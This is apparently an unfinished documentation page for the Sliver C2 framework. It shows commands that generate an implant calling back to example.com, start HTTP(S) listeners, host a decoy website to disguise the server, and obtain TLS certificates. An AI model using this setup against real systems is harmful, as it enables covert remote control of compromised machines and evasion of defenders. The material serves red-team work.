
⚠️ __This page is a work in progress__

# Setup

Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS.
 

## Generate the Sliver (implant)
Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at example.com, run the following:

```
sliver > generate --http example.com

```

## Start the Listener 

```
sliver > http
```

```
sliver > https
```

## Static Content

Sliver can stand up a website on your HTTP(S) listener in order to make the server look more legitimate. For example, you could put a default IIS index page here and mimic a normal-looking server in case someone comes by snooping. You can manage static content using the `websites` command. 

```
websites --website fake-blog --web-path / --content ./index.html add
```


## SSL/TLS Certificates

The `http` listener also supports automatic TLS certificates via Let's Encrypt, which can be enabled using the `--lets-encrypt` flag.

```
sliver > https --domain example.com --lets-encrypt

```

# Under the Hood



